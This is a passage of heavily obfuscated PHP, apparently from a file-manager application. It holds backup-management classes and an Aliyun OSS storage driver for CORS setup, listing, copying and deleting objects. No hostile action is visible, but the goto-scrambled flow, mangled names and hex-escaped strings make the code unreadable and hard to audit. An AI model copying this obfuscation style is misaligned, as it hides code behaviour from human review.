$c×ê¡‡˜†Ú => $D‰¹âª‚ÛÂ) { $EœÆÁ•â‹İ = explode($fñ§óêÏ§Ö[104], $c×ê¡‡˜†Ú); $e„Š„ØÆ = count($EœÆÁ•â‹İ); switch ($e„Š„ØÆ) { case 1: $e¢Å‰¯¦ã[$EœÆÁ•â‹İ[0]] = $D‰¹âª‚ÛÂ; break; case 2: $e¢Å‰¯¦ã[$EœÆÁ•â‹İ[0]][$EœÆÁ•â‹İ[1]] = $D‰¹âª‚ÛÂ; break; case 3: $e¢Å‰¯¦ã[$EœÆÁ•â‹İ[0]][$EœÆÁ•â‹İ[1]][$EœÆÁ•â‹İ[2]] = $D‰¹âª‚ÛÂ; break; } } Model($fñ§óêÏ§Ö[710])->update($e¢Å‰¯¦ã[$fñ§óêÏ§Ö[397]], $e¢Å‰¯¦ã); self::$option = $e¢Å‰¯¦ã; return self::$option; } public function keep() { $C‹›É§øæ =& $_SERVER[¾÷]; $fíâ­öÛ¶¢ = self::get(); if ($fíâ­öÛ¶¢[$C‹›É§øæ[298]][$C‹›É§øæ[715]][$C‹›É§øæ[711]] == $C‹›É§øæ[96]) { return; } $this->backupKeep($fíâ­öÛ¶¢); self::set(array($C‹›É§øæ[726] => 1)); } private function backupKeep($fó«„†…œ¤) { goto C¤®Èôé½ä; e”óø‚£–÷: $cîÀŒ³ôçØ = 0; $E¾Ô©ÙÒˆğ = array(); foreach ($fŸÔ«ªô as $D•éãåšÇÎ) { if ($cîÀŒ³ôçØ >= 7) { break; } $E¾Ô©ÙÒˆğ[] = $D•éãåšÇÎ[$fÅ¬†¶ß[38]]; $cîÀŒ³ôçØ++; } goto B¦†ïÍ…Ø; B¦†ïÍ…Ø: for ($cîÀŒ³ôçØ = 0; $cîÀŒ³ôçØ < 12; $cîÀŒ³ôçØ++) { $E¾Ô©ÙÒˆğ[] = date($fÅ¬†¶ß[727], strtotime("\x2d{$cîÀŒ³ôçØ}\40\155\157\156\x74\150\163")); } $E¾Ô©ÙÒˆğ = array_unique($E¾Ô©ÙÒˆğ); foreach ($fŸÔ«ªô as $D•éãåšÇÎ) { if (!empty($D•éãåšÇÎ[$fÅ¬†¶ß[38]]) && in_array($D•éãåšÇÎ[$fÅ¬†¶ß[38]], $E¾Ô©ÙÒˆğ)) { continue; } Model($fÅ¬†¶ß[710])->remove($D•éãåšÇÎ[$fÅ¬†¶ß[397]]); $F¸Ÿ…ËĞÕø = "\x7b\x69\x6f\72{$fó«„†…œ¤[$fÅ¬†¶ß[713]]}\175\x2f\144\x61\x74\141\x62\x61\x73\145\x2f\x62\141\x63\153\x75\160\x5f{$D•éãåšÇÎ[$fÅ¬†¶ß[38]]}"; IO::remove($F¸Ÿ…ËĞÕø, !1); } goto b¬ß”ŸÆ¯é; C¤®Èôé½ä: $fÅ¬†¶ß =& $_SERVER[¾÷]; $fŸÔ«ªô = Model($fÅ¬†¶ß[710])->listData(); if (empty($fŸÔ«ªô)) { return; } goto e”óø‚£–÷; b¬ß”ŸÆ¯é: } public function db() { goto D÷©Íãùñ; D÷©Íãùñ: $dó‘Ê´½„á =& $_SERVER[¾÷]; $fèçµÅÒ®È = self::get(); if ($fèçµÅÒ®È[$dó‘Ê´½„á[298]][$dó‘Ê´½„á[716]][$dó‘Ê´½„á[711]] == $dó‘Ê´½„á[96]) { return !0; } goto F£ø¸ìŸ‰Ş; c›»ùĞÕ®: return !0; goto b¿Í·å„‡‡; F£ø¸ìŸ‰Ş: $AŠÜ‡¸™Ë = new BackupDb(); if (!$AŠÜ‡¸™Ë->index()) { return !1; } self::set(array($dó‘Ê´½„á[728] => 1)); goto c›»ùĞÕ®; b¿Í·å„‡‡: } public function dbFile() { goto cÊ…ãë³ÚÄ; dÙ³†è•÷—: return !0; goto a•ğÎ…ÀØ; aÕ¬ÙÍ÷æÔ: $aëÉŞÏÏ‚ = new BackupDbFile(); if (!$aëÉŞÏÏ‚->index()) { return !1; } self::set(array($B‹õ¯Ä¾±ƒ[729] => 1)); goto dÙ³†è•÷—; cÊ…ãë³ÚÄ: $B‹õ¯Ä¾±ƒ =& $_SERVER[¾÷]; $EèéñôÅóÔ = self::get(); if ($EèéñôÅóÔ[$B‹õ¯Ä¾±ƒ[298]][$B‹õ¯Ä¾±ƒ[719]][$B‹õ¯Ä¾±ƒ[711]] == $B‹õ¯Ä¾±ƒ[96]) { return !0; } goto aÕ¬ÙÍ÷æÔ; a•ğÎ…ÀØ: } public function file() { $CöÎ›´ÄÃ =& $_SERVER[¾÷]; $FÎéõÉõ‹– = self::get(); if ($FÎéõÉõ‹–[$CöÎ›´ÄÃ[298]][$CöÎ›´ÄÃ[201]][$CöÎ›´ÄÃ[711]] == $CöÎ›´ÄÃ[96]) { return !0; } if (!isset($FÎéõÉõ‹–[$CöÎ›´ÄÃ[714]]) || $FÎéõÉõ‹–[$CöÎ›´ÄÃ[714]] == $CöÎ›´ÄÃ[500]) { $eìÄ…¢Œë† = new BackupFile(); if (!$eìÄ…¢Œë†->index()) { return !1; } } self::set(array($CöÎ›´ÄÃ[730] => 1, $CöÎ›´ÄÃ[711] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto eÑä¸•ÒÜË; F¨›˜”¤¼‰: return !0; goto F’® š‘´; AÁ¹ä‰ñœ¬: $eàĞ¬·éß‚ = new DbManage($F¸ÃÜ±¬â, $b«‚ŠÇ°ğâ); $C¨ëÚÉŞí = TEMP_FILES . $Bö¦ÊÕ”ŠÊ[731] . self::$name . $Bö¦ÊÕ”ŠÊ[18]; del_dir($C¨ëÚÉŞí); goto Bô‹ÃĞ¥•; C¥´Ì¬˜…Ø: $b¦ƒô…Œ´ß = array($Bö¦ÊÕ”ŠÊ[743] => $b«‚ŠÇ°ğâ, $Bö¦ÊÕ”ŠÊ[728] => 1, $Bö¦ÊÕ”ŠÊ[744] => $b½ÒŒ²´Œ, $Bö¦ÊÕ”ŠÊ[745] => $f³‘šñ„µë); Backup::set($b¦ƒô…Œ´ß); if ($b½ÒŒ²´Œ > $f³‘šñ„µë) { return !1; } goto F¨›˜”¤¼‰; Bô‹ÃĞ¥•: mk_dir($C¨ëÚÉŞí); $b½ÒŒ²´Œ = $f³‘šñ„µë = 0; try { $a®·ÀâÉŒö = $eàĞ¬·éß‚->db()->getTables(); } catch (Exception $F÷Ã´Ñ­×Ø) { return !1; } goto FÓ¹ŞºŠÀÓ; dåÖß†§’Ä: self::$name = $bÄò½Õïá¶[$Bö¦ÊÕ”ŠÊ[38]]; $F¸ÃÜ±¬â = $GLOBALS[$Bö¦ÊÕ”ŠÊ[16]][$Bö¦ÊÕ”ŠÊ[27]]; $b«‚ŠÇ°ğâ = $this->_dbType($F¸ÃÜ±¬â); goto AÁ¹ä‰ñœ¬; FÓ¹ŞºŠÀÓ: $a®·ÀâÉŒö = array_diff($a®·ÀâÉŒö, array($Bö¦ÊÕ”ŠÊ[732], $Bö¦ÊÕ”ŠÊ[733])); foreach ($a®·ÀâÉŒö as $F„ŒÏ‹ä‘Ï) { $b½ÒŒ²´Œ += $eàĞ¬·éß‚->model($F„ŒÏ‹ä‘Ï)->count(); } $d®ñâæÛ®ñ = new Task($Bö¦ÊÕ”ŠÊ[734], $Bö¦ÊÕ”ŠÊ[735], $b½ÒŒ²´Œ, LNG($Bö¦ÊÕ”ŠÊ[736]) . $Bö¦ÊÕ”ŠÊ[737] . LNG($Bö¦ÊÕ”ŠÊ[738])); goto CÁÑ¬ Ó“…; CÁÑ¬ Ó“…: foreach ($a®·ÀâÉŒö as $F„ŒÏ‹ä‘Ï) { $F¸°ó«¨•à = $C¨ëÚÉŞí . $F„ŒÏ‹ä‘Ï . $Bö¦ÊÕ”ŠÊ[739]; $D¦Íœ¦±¢­ = null; if ($F„ŒÏ‹ä‘Ï == $Bö¦ÊÕ”ŠÊ[740] && (!isset($bÄò½Õïá¶[$Bö¦ÊÕ”ŠÊ[714]]) || $bÄò½Õïá¶[$Bö¦ÊÕ”ŠÊ[714]] == $Bö¦ÊÕ”ŠÊ[500])) { $D¦Íœ¦±¢­ = self::$io; } $f³‘šñ„µë += $eàĞ¬·éß‚->sqlFromDb($F„ŒÏ‹ä‘Ï, $F¸°ó«¨•à, $d®ñâæÛ®ñ, $D¦Íœ¦±¢­); } if (isset($d®ñâæÛ®ñ->task[$Bö¦ÊÕ”ŠÊ[741]])) { $A„ôÎ§éÍÁ = $d®ñâæÛ®ñ->task[$Bö¦ÊÕ”ŠÊ[741]] ? $d®ñâæÛ®ñ->task[$Bö¦ÊÕ”ŠÊ[741]] : timeFloat(); $e©ÁŞ‡²Ö = $A„ôÎ§éÍÁ - $d®ñâæÛ®ñ->task[$Bö¦ÊÕ”ŠÊ[742]]; if ($e©ÁŞ‡²Ö >= 0.2) { $b½ÒŒ²´Œ += 1; } } $d®ñâæÛ®ñ->end(); goto C¥´Ì¬˜…Ø; eÑä¸•ÒÜË: $Bö¦ÊÕ”ŠÊ =& $_SERVER[¾÷]; $bÄò½Õïá¶ = Backup::get(); self::$io = $bÄò½Õïá¶[$Bö¦ÊÕ”ŠÊ[713]]; goto dåÖß†§’Ä; F’® š‘´: } private function _dbType($CÖùºšš) { goto B˜ÊÎª“¨×; B˜ÊÎª“¨×: $cÔ‰•Ï›Ê„ =& $_SERVER[¾÷]; $CÖùºšš = array_change_key_case($CÖùºšš); $aÉ°Æ÷Õ« = $CÖùºšš[$cÔ‰•Ï›Ê„[746]]; goto E¶ó¿Ç¿ä; E¶ó¿Ç¿ä: if ($aÉ°Æ÷Õ« == $cÔ‰•Ï›Ê„[747]) { $D²†ê÷„Ï— = explode($cÔ‰•Ï›Ê„[14], $CÖùºšš[$cÔ‰•Ï›Ê„[748]]); $aÉ°Æ÷Õ« = $D²†ê÷„Ï—[0]; } $Dˆ¿¾êµî‹ = array($cÔ‰•Ï›Ê„[749] => $cÔ‰•Ï›Ê„[19], $cÔ‰•Ï›Ê„[750] => $cÔ‰•Ï›Ê„[751]); if (isset($Dˆ¿¾êµî‹[$aÉ°Æ÷Õ«])) { $aÉ°Æ÷Õ« = $Dˆ¿¾êµî‹[$aÉ°Æ÷Õ«]; } goto eï‚İò‚Åê; eï‚İò‚Åê: return $aÉ°Æ÷Õ«; goto F…ŠÀÙÌ‘ğ; F…ŠÀÙÌ‘ğ: } } goto CŞƒ³†Ïùè; E£ì«õÀ·: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($A§èÙ‡ŞÖŠ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¾÷][1235]; $this->_init($A§èÙ‡ŞÖŠ); } public function _init($DĞµºŒí½Æ) { $BÙ“ÇèÏÈ =& $_SERVER[¾÷]; foreach ($DĞµºŒí½Æ as $e„ÏõÒ—ÅÁ => $eÄŒíƒƒç) { if (isset($this->{$e„ÏõÒ—ÅÁ})) { $this->{$e„ÏõÒ—ÅÁ} = $eÄŒíƒƒç; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($BÙ“ÇèÏÈ[1236] . LNG($BÙ“ÇèÏÈ[1237])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto C±Ö´…¡; C±Ö´…¡: $EÜ¾é×…ç =& $_SERVER[¾÷]; $cáÏ‹—Êø¬ = new OSS\Model\CorsConfig(); $AÛ±®‚”Í¿ = new OSS\Model\CorsRule(); goto EµİÛ ½¼¡; DğàºïßÆ: $cáÏ‹—Êø¬->addRule($AÛ±®‚”Í¿); try { $this->client->putBucketCors($this->bucket, $cáÏ‹—Êø¬); } catch (OSS\Core\OssException $BÑêĞƒ“Ñ) { return !1; } return !0; goto E†ë¥ÉŸ¹Ò; F²İƒê½”Ñ: $AÛ±®‚”Í¿->addAllowedMethod($EÜ¾é×…ç[1241]); $AÛ±®‚”Í¿->addAllowedMethod($EÜ¾é×…ç[1242]); $AÛ±®‚”Í¿->addAllowedMethod($EÜ¾é×…ç[167]); goto aˆ·œÆ˜°×; aˆ·œÆ˜°×: $AÛ±®‚”Í¿->setMaxAgeSeconds(600); $AÛ±®‚”Í¿->addExposeHeader($EÜ¾é×…ç[1243]); $AÛ±®‚”Í¿->addAllowedHeader($EÜ¾é×…ç[1238]); goto DğàºïßÆ; EµİÛ ½¼¡: $AÛ±®‚”Í¿->addAllowedOrigin($EÜ¾é×…ç[1238]); $AÛ±®‚”Í¿->addAllowedMethod($EÜ¾é×…ç[1239]); $AÛ±®‚”Í¿->addAllowedMethod($EÜ¾é×…ç[1240]); goto F²İƒê½”Ñ; E†ë¥ÉŸ¹Ò: } public function getBucketCors() { goto b‚±Ñ˜èŒ¬; DÏ‹çÖ³Ñ„: $fÖÌÖîŞ‚ = $e¹ÕİŒŒ‹[0]->getMaxAgeSeconds(); $f ë‰™Åß² = $e¹ÕİŒŒ‹[0]->getExposeHeaders(); $aö¯ª—îöŸ = $e¹ÕİŒŒ‹[0]->getAllowedHeaders(); goto EõÍ‘£›é; DËĞá¼ßêÍ: if (!$AŠØ¯ö¿¦Ğ || !($e¹ÕİŒŒ‹ = $AŠØ¯ö¿¦Ğ->getRules())) { return null; } $c²Ô–—»õ¥ = $e¹ÕİŒŒ‹[0]->getAllowedOrigins(); $F»Ò„èñ®â = $e¹ÕİŒŒ‹[0]->getAllowedMethods(); goto DÏ‹çÖ³Ñ„; b‚±Ñ˜èŒ¬: $C¬‹Àİ«§£ =& $_SERVER[¾÷]; $AŠØ¯ö¿¦Ğ = null; try { $AŠØ¯ö¿¦Ğ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $BÚ¿®êÀº) { return null; } goto DËĞá¼ßêÍ; EõÍ‘£›é: return array($C¬‹Àİ«§£[190] => isset($c²Ô–—»õ¥[0]) ? $c²Ô–—»õ¥[0] : $C¬‹Àİ«§£[43], $C¬‹Àİ«§£[194] => $F»Ò„èñ®â, $C¬‹Àİ«§£[1244] => $fÖÌÖîŞ‚, $C¬‹Àİ«§£[1245] => isset($f ë‰™Åß²[0]) ? $f ë‰™Åß²[0] : $C¬‹Àİ«§£[43], $C¬‹Àİ«§£[192] => isset($aö¯ª—îöŸ[0]) ? $aö¯ª—îöŸ[0] : $C¬‹Àİ«§£[43]); goto a‰¿ìÏ¢·Ò; a‰¿ìÏ¢·Ò: } public function isBucketCors() { goto c‘‡×ï°Ö ; D ¸„ÜŞÓß: if ($E©Ğôˆ»Ä‡[$Dã·×«¤™ƒ[190]] != $Dã·×«¤™ƒ[191] || $E©Ğôˆ»Ä‡[$Dã·×«¤™ƒ[192]] != $Dã·×«¤™ƒ[191]) { return !1; } $Eãµ£”ñ” = array_map($Dã·×«¤™ƒ[193], $E©Ğôˆ»Ä‡[$Dã·×«¤™ƒ[194]]); if (!is_array($Eãµ£”ñ”)) { $Eãµ£”ñ” = array(); } goto føàØ„İ²†; føàØ„İ²†: $d­›Á±¢ù = array($Dã·×«¤™ƒ[195], $Dã·×«¤™ƒ[196], $Dã·×«¤™ƒ[197], $Dã·×«¤™ƒ[198], $Dã·×«¤™ƒ[199]); $EÜí“˜Ã‰ = array_diff($d­›Á±¢ù, $Eãµ£”ñ”); return empty($EÜí“˜Ã‰); goto Fö´†ê¿äó; c‘‡×ï°Ö : $Dã·×«¤™ƒ =& $_SERVER[¾÷]; $E©Ğôˆ»Ä‡ = $this->getBucketCors(); if (!$E©Ğôˆ»Ä‡ || !is_array($E©Ğôˆ»Ä‡)) { return !1; } goto D ¸„ÜŞÓß; Fö´†ê¿äó: } public function mkfile($C»¿š¸¹ñ, $FÊ¾Å¾ÚË» = '', $AîåâÂô‘ = REPEAT_RENAME) { $DÅö—ÖÀ³¡ = $this->setContent($C»¿š¸¹ñ, $FÊ¾Å¾ÚË»); if ($DÅö—ÖÀ³¡ !== !1) { return $this->getPathOuter($C»¿š¸¹ñ); } return !1; } public function mkdir($D–á´êñØ, $a¤Œ‘Ø§áÍ = REPEAT_SKIP) { if ($this->_isFolder($D–á´êñØ)) { return $this->getPathOuter($D–á´êñØ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($D–á´êñØ)); } catch (OSS\Core\OssException $Cï£‡Ó´ˆ) { return !1; } return $this->getPathOuter($D–á´êñØ); } private function fileList($aÊõå…¥Èó, $Bƒ…¦‚æ = '', $D‘Ğæ²Œä¤ = 0) { goto aŸ¢‘Ã…Š¿; aŸ¢‘Ã…Š¿: $FÔšÚßøÈÚ =& $_SERVER[¾÷]; $aÊõå…¥Èó = trim($aÊõå…¥Èó, $FÔšÚßøÈÚ[18]); $E¶§«õ™—‰ = empty($aÊõå…¥Èó) ? $FÔšÚßøÈÚ[43] : $aÊõå…¥Èó . $FÔšÚßøÈÚ[18]; goto b»“»¨¬•ò; b»“»¨¬•ò: $D°Õ¬ôÑÆ = $FÔšÚßøÈÚ[43]; $e—İàğ‹ºŠ = 1000; $AÙ”„¿½ñ¯ = $this->listItemCache === !1 ? !1 : !0; goto BáîÙĞôœÒ; EÖ±öˆùª­: return array($FÔšÚßøÈÚ[84] => $d¾×ÆÉí ¦, $FÔšÚßøÈÚ[83] => $D‘ºœĞƒØ‡); goto fÀÓœĞ; BáîÙĞôœÒ: $d¾×ÆÉí ¦ = $D‘ºœĞƒØ‡ = array(); while (!0) { check_abort(); $FŸØƒË½ŸÖ = array($FÔšÚßøÈÚ[1246] => $Bƒ…¦‚æ, $FÔšÚßøÈÚ[1247] => $E¶§«õ™—‰, $FÔšÚßøÈÚ[1248] => $e—İàğ‹ºŠ, $FÔšÚßøÈÚ[1249] => $D°Õ¬ôÑÆ); try { $CÜ©Ò‡‘½Ÿ = $this->client->listObjects($this->bucket, $FŸØƒË½ŸÖ); } catch (OSS\Core\OssException $b¸ó¡·ä¢) { break; } $D°Õ¬ôÑÆ = $CÜ©Ò‡‘½Ÿ->getNextMarker(); $CÌèù¿Ä»ö = $CÜ©Ò‡‘½Ÿ->getObjectList(); $dº¦£´¥—™ = $CÜ©Ò‡‘½Ÿ->getPrefixList(); foreach ($CÌèù¿Ä»ö as $b‘Õ¼¿³ÊÉ) { goto f›–¼†“; Eåƒ…Àêƒ»: if ($AÙ”„¿½ñ¯) { $this->cacheMethod($FÔšÚßøÈÚ[207], $AÓ…×·å¢î, $FÍÎãƒŒé·); $this->cacheMethod($FÔšÚßøÈÚ[208], $AÓ…×·å¢î, array($FÔšÚßøÈÚ[87] => $c‡š”Û˜æ, $FÔšÚßøÈÚ[1250] => $c‡š”Û˜æ, $FÔšÚßøÈÚ[93] => strtotime($Dùà¡òÈö), $FÔšÚßøÈÚ[1251] => $Dùà¡òÈö)); } if ($FÍÎãƒŒé·) { $d¾×ÆÉí ¦[] = $AÓ…×·å¢î; continue; } $D‘ºœĞƒØ‡[] = $AÌÑé‹š‹Ñ; goto dáÇÙĞøù; f›–¼†“: if ($b‘Õ¼¿³ÊÉ->getKey() == $E¶§«õ™—‰) { continue; } $AÓ…×·å¢î = $b‘Õ¼¿³ÊÉ->getKey(); $c‡š”Û˜æ = $b‘Õ¼¿³ÊÉ->getSize(); goto B™‘Ù¯èµ; B™‘Ù¯èµ: $Dùà¡òÈö = $b‘Õ¼¿³ÊÉ->getLastModified(); $AÌÑé‹š‹Ñ = $D‘Ğæ²Œä¤ ? array($FÔšÚßøÈÚ[38] => $AÓ…×·å¢î, $FÔšÚßøÈÚ[87] => $c‡š”Û˜æ, $FÔšÚßøÈÚ[205] => strtotime($Dùà¡òÈö)) : $AÓ…×·å¢î; $FÍÎãƒŒé· = $c‡š”Û˜æ == 0 && substr($AÓ…×·å¢î, strlen($AÓ…×·å¢î) - 1, 1) == $FÔšÚßøÈÚ[18] ? !0 : !1; goto Eåƒ…Àêƒ»; dáÇÙĞøù: } foreach ($dº¦£´¥—™ as $fëËÂæ‘Âê) { $d¾×ÆÉí ¦[] = $fëËÂæ‘Âê->getPrefix(); if ($AÙ”„¿½ñ¯) { $this->cacheMethod($FÔšÚßøÈÚ[207], $AÓ…×·å¢î, !0); } } if ($D°Õ¬ôÑÆ === $FÔšÚßøÈÚ[43]) { break; } } if ($AÙ”„¿½ñ¯) { $this->cacheMethod($FÔšÚßøÈÚ[207], $aÊõå…¥Èó, !0); } goto EÖ±öˆùª­; fÀÓœĞ: } public function copyFile($CÀÄ‰¿î÷, $eÊø«Ğ‚Òî) { $F–’„ÎÁÉ = $this->size($CÀÄ‰¿î÷); if ($F–’„ÎÁÉ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $CÀÄ‰¿î÷, $this->bucket, $this->pathEncode($eÊø«Ğ‚Òî)); } catch (OSS\Core\OssException $a˜„í«â®) { return !1; } return $this->getPathOuter($eÊø«Ğ‚Òî); } $aÓ«Î¤ï = $this->multiCopyObject($CÀÄ‰¿î÷, $eÊø«Ğ‚Òî, $F–’„ÎÁÉ); return $aÓ«Î¤ï ? $this->getPathOuter($eÊø«Ğ‚Òî) : !1; } private function multiCopyObject($dŠ–•¤¶‡†, $D«‘š«¬â, $bğƒ³…ÚîÄ) { $D‡­Á”¬Â• =& $_SERVER[¾÷]; try { goto d£¨‡×‚ºÛ; DŞ´öËèÛ: $B”‚‰£™ßÖ = 1; $bî¸ë·Œ³Í = 0; $BˆÃÖ•ìÔÏ = array(); goto aøÉÆİ¢“; d£¨‡×‚ºÛ: $E›‘ÄŠ‚˜ˆ = array(); if ($DâÅ°¾ÒÆÚ = $this->hashMd5($dŠ–•¤¶‡†)) { $E›‘ÄŠ‚˜ˆ = array(OSS\OssClient::OSS_HEADERS => array($D‡­Á”¬Â•[1252] => $DâÅ°¾ÒÆÚ)); } $e—ÂÃ¼ ó¦ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($D«‘š«¬â), $E›‘ÄŠ‚˜ˆ); goto DŞ´öËèÛ; aøÉÆİ¢“: $C‰´ŒØÉö = 1024 * 1024 * 10; $CÀ½Ç£éƒ = $this->client->generateMultiuploadParts($bğƒ³…ÚîÄ, $C‰´ŒØÉö); foreach ($CÀ½Ç£éƒ as $BõòÅµ¥ñ => $B½‘ğÄïÄ‘) { $dÄ¬°Ã¸ = $bî¸ë·Œ³Í + (int) $B½‘ğÄïÄ‘[$D‡­Á”¬Â•[1253]]; $A÷œÎŞ‚•  = (int) $B½‘ğÄïÄ‘[$D‡­Á”¬Â•[342]] + $dÄ¬°Ã¸ - 1; $e£ø¥‘„ÅÕ = array($D‡­Á”¬Â•[1254] => $dÄ¬°Ã¸, $D‡­Á”¬Â•[1255] => $A÷œÎŞ‚• ); $BˆÃÖ•ìÔÏ[] = $this->client->uploadPartCopy($this->bucket, $dŠ–•¤¶‡†, $this->bucket, $this->pathEncode($D«‘š«¬â), $B”‚‰£™ßÖ, $e—ÂÃ¼ ó¦, $e£ø¥‘„ÅÕ); $B”‚‰£™ßÖ = $B”‚‰£™ßÖ + 1; } goto fí´¾‡ï®¾; fí´¾‡ï®¾: $B…ğÈìè‘ö = array(); foreach ($BˆÃÖ•ìÔÏ as $BõòÅµ¥ñ => $bÖò„ÚöåÑ) { $B…ğÈìè‘ö[] = array($D‡­Á”¬Â•[1256] => $BõòÅµ¥ñ + 1, $D‡­Á”¬Â•[1257] => $bÖò„ÚöåÑ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($D«‘š«¬â), $e—ÂÃ¼ ó¦, $B…ğÈìè‘ö); goto C¸•ÖÑ§ª°; C¸•ÖÑ§ª°: } catch (OSS\Core\OssException $DÆ“‡æ¶—) { return !1; } return !0; } public function moveFile($DÓ¸÷ùÛµ¾, $fĞ‹æ‹˜Ìƒ) { if ($this->copyFile($DÓ¸÷ùÛµ¾, $fĞ‹æ‹˜Ìƒ)) { $this->remove($DÓ¸÷ùÛµ¾); return $this->getPathOuter($fĞ‹æ‹˜Ìƒ); } return !1; } public function delFile($EŸŠÒÜ›æ¬) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($EŸŠÒÜ›æ¬)); } catch (OSS\Core\OssException $C‰™Ò¡¡Ñ) { return !1; } return !0; } public function delFolder($B¨Ü°‰±ñ) { goto b¡ö‰ÈÇÊ; cì®œÔùåİ: if (!empty($B¨Ü°‰±ñ) && !in_array($EğÚ¿Ãìõ, $aµœ¤ƒ†¢‘[$fÂ’ ô–³Ã[84]])) { $aµœ¤ƒ†¢‘[$fÂ’ ô–³Ã[84]][] = $EğÚ¿Ãìõ; } $eì¬ïöî­ = $this->delByBatch($aµœ¤ƒ†¢‘[$fÂ’ ô–³Ã[83]]); if (!$eì¬ïöî­) { return !1; } goto C‹ßî¬ÑÖ›; fÏñ£¹º: $aµœ¤ƒ†¢‘ = $this->fileList($B¨Ü°‰±ñ); $this->listItemCache = !0; $EğÚ¿Ãìõ = trim($B¨Ü°‰±ñ, $fÂ’ ô–³Ã[18]) . $fÂ’ ô–³Ã[18]; goto cì®œÔùåİ; C‹ßî¬ÑÖ›: return $this->delByBatch($aµœ¤ƒ†¢‘[$fÂ’ ô–³Ã[84]]); goto B’ß„«à¬­; b¡ö‰ÈÇÊ: $fÂ’ ô–³Ã =& $_SERVER[¾÷]; if (!$this->exist($B¨Ü°‰±ñ)) { return !0; } $this->listItemCache = !1; goto fÏñ£¹º; B’ß„«à¬­: } private function delByBatch($Bä…Àö·Óï) { foreach (array_chunk($Bä…Àö·Óï, 1000) as $D†»»íÖÈÙ) { try { $this->client->deleteObjects($this->bucket, $D†»»íÖÈÙ); } catch (OSS\Core\OssException $dÕŒÅ¾ö´Ö) { return !1; } } return !0; } public function rename($eˆÒÌ¯ŞÏ, $D ±šœê£) { return $this->renameObject($eˆÒÌ¯ŞÏ, $D ±šœê£); } private function fileInfo($A£­£§ç°, $aØÍ‚ëô¥¯ = false, $døƒ„á— = array()) { goto Cäí³¾Ë“ç; fÊ¥„—åÍ‘: $D¥òó˜Ë³[$bØÀÇ×‹«[202]] = $D¥òó˜Ë³[$bØÀÇ×‹«[93]] = 0; $D¥òó˜Ë³[$bØÀÇ×‹«[203]] = $D¥òó˜Ë³[$bØÀÇ×‹«[204]] = !0; if (empty($døƒ„á—)) { $céÒôà‹ˆ´ = $this->objectMeta($A£­£§ç°); if (!$céÒôà‹ˆ´) { return $D¥òó˜Ë³; } $døƒ„á— = array($bØÀÇ×‹«[93] => strtotime($céÒôà‹ˆ´[$bØÀÇ×‹«[1251]]), $bØÀÇ×‹«[87] => $céÒôà‹ˆ´[$bØÀÇ×‹«[1250]] + 0); } goto B»…¹¦ ; B»…¹¦ : if (isset($døƒ„á—[$bØÀÇ×‹«[87]])) { $D¥òó˜Ë³[$bØÀÇ×‹«[87]] = $døƒ„á—[$bØÀÇ×‹«[87]]; } if (isset($døƒ„á—[$bØÀÇ×‹«[93]])) { $D¥òó˜Ë³[$bØÀÇ×‹«[93]] = $døƒ„á—[$bØÀÇ×‹«[93]]; } if (isset($døƒ„á—[$bØÀÇ×‹«[205]]) && !trim($D¥òó˜Ë³[$bØÀÇ×‹«[93]])) { $D¥òó˜Ë³[$bØÀÇ×‹«[93]] = $døƒ„á—[$bØÀÇ×‹«[205]]; } goto D…ÍÀ¢¢Õ”; D…ÍÀ¢¢Õ”: return $D¥òó˜Ë³; goto BÙ¼±¡«¾Ï; Cäí³¾Ë“ç: $bØÀÇ×‹« =& $_SERVER[¾÷]; $D¥òó˜Ë³ = array($bØÀÇ×‹«[38] => $this->pathThis($A£­£§ç°), $bØÀÇ×‹«[85] => $this->getPathOuter($A£­£§ç°), $bØÀÇ×‹«[39] => $bØÀÇ×‹«[201], $bØÀÇ×‹«[87] => isset($døƒ„á—[$bØÀÇ×‹«[87]]) ? $døƒ„á—[$bØÀÇ×‹«[87]] : 0, $bØÀÇ×‹«[177] => $this->ext($A£­£§ç°)); if ($aØÍ‚ëô¥¯) { return $D¥òó˜Ë³; } goto fÊ¥„—åÍ‘; BÙ¼±¡«¾Ï: } private function folderInfo($D±¸®ÅÏƒ‡, $dŸËìë ëî = false, $cõçÆêÏÜ = array()) { goto cµÂ æã–ò; cµÂ æã–ò: $A’Óùø¯Ö× =& $_SERVER[¾÷]; $E­áÉõÀù = array($A’Óùø¯Ö×[38] => $this->pathThis($D±¸®ÅÏƒ‡), $A’Óùø¯Ö×[85] => $this->getPathOuter($A’Óùø¯Ö×[18] . $D±¸®ÅÏƒ‡), $A’Óùø¯Ö×[39] => $A’Óùø¯Ö×[86]); if ($dŸËìë ëî) { return $E­áÉõÀù; } goto f­á¨•Ï›–; f­á¨•Ï›–: $E­áÉõÀù[$A’Óùø¯Ö×[202]] = $E­áÉõÀù[$A’Óùø¯Ö×[93]] = 0; $E­áÉõÀù[$A’Óùø¯Ö×[203]] = $E­áÉõÀù[$A’Óùø¯Ö×[204]] = !0; if (empty($cõçÆêÏÜ)) { $D±¸®ÅÏƒ‡ = rtrim($D±¸®ÅÏƒ‡, $A’Óùø¯Ö×[18]) . $A’Óùø¯Ö×[18]; $B­äßÕ¥Û´ = $this->objectMeta($D±¸®ÅÏƒ‡); if (!$B­äßÕ¥Û´) { return $E­áÉõÀù; } $cõçÆêÏÜ = array($A’Óùø¯Ö×[202] => $B­äßÕ¥Û´[$A’Óùø¯Ö×[1258]][$A’Óùø¯Ö×[1259]], $A’Óùø¯Ö×[93] => strtotime($B­äßÕ¥Û´[$A’Óùø¯Ö×[1251]])); } goto cÔÒæ¨¥à; cÔÒæ¨¥à: if (isset($cõçÆêÏÜ[$A’Óùø¯Ö×[93]])) { $E­áÉõÀù[$A’Óùø¯Ö×[93]] = $cõçÆêÏÜ[$A’Óùø¯Ö×[93]]; 